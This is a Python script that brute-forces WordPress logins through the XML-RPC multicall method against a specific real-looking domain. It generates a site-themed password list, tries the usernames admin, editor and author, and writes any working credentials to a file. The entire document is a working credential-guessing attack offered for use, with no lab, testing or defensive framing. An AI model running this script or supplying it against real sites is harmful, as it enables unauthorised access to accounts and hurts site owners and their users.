import xmlrpc.client
from datetime import datetime

# === Config ===
TARGET = "https://www.zayachek.com/xmlrpc.php"
usernames = ["admin", "editor", "author"]  # Replace with your usernames

# === Wordlist-Generator ===
def generate_wordlist(base="zayachek"):
    year = datetime.now().year
    common = ["123", "!", "@", "admin", str(year), "2024", "2025", "pass", "wp"]
    combos = set()

    for suffix in common:
        combos.add(base + suffix)
        combos.add(base.capitalize() + suffix)
        combos.add(base + suffix + "!")
        combos.add(base + "_" + suffix)
        combos.add("admin" + suffix)

    # Add some static guesses
    static = ["password", "letmein", "welcome123", "qwerty", "zayachek!"]
    combos.update(static)

    return list(combos)

# === Brute Forcing ===
def brute_force(url, usernames, passwords):
    server = xmlrpc.client.ServerProxy(url)
    print(f"[*] Target: {url}")
    hits = []

    for user in usernames:
        print(f"\n[*] Trying user: {user}")
        multicall = xmlrpc.client.MultiCall(server)
        for password in passwords:
            multicall.wp.getUsersBlogs(user, password)
        
        try:
            responses = multicall()
            for i, response in enumerate(responses):
                if not isinstance(response, xmlrpc.client.Fault):
                    hit = f"{user}: {passwords[i]}"
                    print(f"[+] HIT: {hit}")
                    hits.append(hit)
        except Exception as e:
            print(f"[-] Error with {user}: {e}")

    if hits:
        with open("hits.txt", "w") as f:
            for hit in hits:
                f.write(hit + "\n")
        print(f"\n[+] Saved valid logins to hits.txt")
    else:
        print("\n[-] No valid logins found.")

# === Main ===
if __name__ == "__main__":
    print("[*] Generating smart wordlist...")
    wordlist = generate_wordlist()
    brute_force(TARGET, usernames, wordlist)

